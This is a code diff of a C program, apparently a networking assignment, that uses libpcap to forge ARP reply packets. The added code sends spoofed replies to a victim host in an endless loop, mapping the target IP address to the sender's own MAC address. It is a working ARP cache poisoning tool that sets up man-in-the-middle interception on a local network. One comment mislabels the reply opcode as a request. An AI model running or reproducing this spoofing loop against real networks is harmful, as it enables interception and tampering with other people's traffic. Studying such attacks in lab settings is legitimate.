@@ -108,52 +108,40 @@ int sendArpReq(pcap_t *fp, char* interface, char* target){
     return 0;
 }
 
-int sendArpRepl(pcap_t *fp, char* interface, char* sMAC, char* dMAC, char* source, char* target){
+int sendArpRepl(pcap_t *fp, u_int8_t* sMAC, u_int8_t* dMAC, char* source, char* target){
 
-    int i = 0;
-    int length = 0;
-    int offset = 0;
-
-    char address[32] = { 0, };
+    int i = 0, length = 0, offset = 0;
     u_char tmp[42];
 
-    struct in_addr srcip;
     struct in_addr targetip;
+    struct in_addr srcip;
     struct ether_header eh;
     struct arp_header ah;
-    struct sockaddr_in *aptr;
 
-    //
-    // Ethernet header
-    //
-
+    // Dhost -> Destination , Shost -> My MAC
     for(i = 0; i < 6; i++){
         eh.ether_dhost[i] = dMAC[i];
         eh.ether_shost[i] = sMAC[i];
     }
+
     eh.ether_type = htons(0x0806);  // Ethernet type : ARP(0x0806)
 
-    //
-    // ARP Header
-    //
+    ah.ar_hrd = htons(0x0001); // Hardware type : Ethernet(0x0001)
+    ah.ar_pro = htons(0x0800); // Protocol type : IPv4(0x0800)
+    ah.ar_hln = 6;             // Hardware size : 6
+    ah.ar_pln = 4;             // Protocol size : 4
+    ah.ar_op = htons(0x0002);  // Opcode(Req)   : 1
 
-    ah.ar_hrd = htons(0x0001);      // Hardware type : Ethernet(0x0001)
-    ah.ar_pro = htons(0x0800);      // Protocol type : IPv4(0x0800)
-    ah.ar_hln = 6;                  // Hardware size : 6
-    ah.ar_pln = 4;                  // Protocol size : 4
-    ah.ar_op = htons(0x0002);       // Opcode(Repl)  : 2
-
-    // ah.ar_spa = aptr->sin_addr.s_addr;
+    for(i = 0; i < 6; i++){
+        ah.ar_tha[i] = dMAC[i];
+        ah.ar_sha[i] = sMAC[i];
+    }
 
     inet_aton(source, &srcip.s_addr);
     ah.ar_spa = srcip.s_addr;
 
     inet_aton(target, &targetip.s_addr);
-    ah.ar_tpa = targetip.s_addr;
-
-    //
-    // Making packet
-    //
+    ah.ar_tpa = targetip.s_addr; // sender
 
     length = sizeof(struct ether_header);
     offset += length;
@@ -163,7 +151,7 @@ int sendArpRepl(pcap_t *fp, char* interface, char* sMAC, char* dMAC, char* sourc
 
     if(pcap_sendpacket(fp, tmp, 42)!=0){
         fprintf(stderr, "sendpacket_error\n");
-        return -1;
+        return 1;
     }
     return 0;
 }
@@ -174,7 +162,6 @@ int main(int argc, char *argv[]){
         int i = 0;
         int res;
         int offset = 14;
-        char* address;
         char errbuf[PCAP_ERRBUF_SIZE];
         const unsigned char *pkt_data;
 
@@ -183,14 +170,12 @@ int main(int argc, char *argv[]){
         struct arp_header *arp;
 
         pcap_t *fp;
-        u_char *tmp;
         u_int8_t sMAC[6];
 
         if(argc != 4){
             printf("Usage : AS3 <interface> <sender ip> <target ip>\n");
             exit(1);
         }
-
 
         if((fp = pcap_open_live(argv[1], 65536, 1, 0, errbuf)) == NULL){
                 printf("[!] Packet descriptor Error!!!\n");
@@ -227,6 +212,12 @@ int main(int argc, char *argv[]){
             }
         }
 
+        i = 0;
+        while(1){
+            printf("Send ARP reply Packet! %d\n", i);
+            // int sendArpRepl(pcap_t *fp, u_int8_t* sMAC, u_int8_t* dMAC, char* source, char* target)
+            sendArpRepl(fp, eth->ether_dhost, eth->ether_shost, argv[3], argv[2]);
+        }
+
         return 0;
 }
-
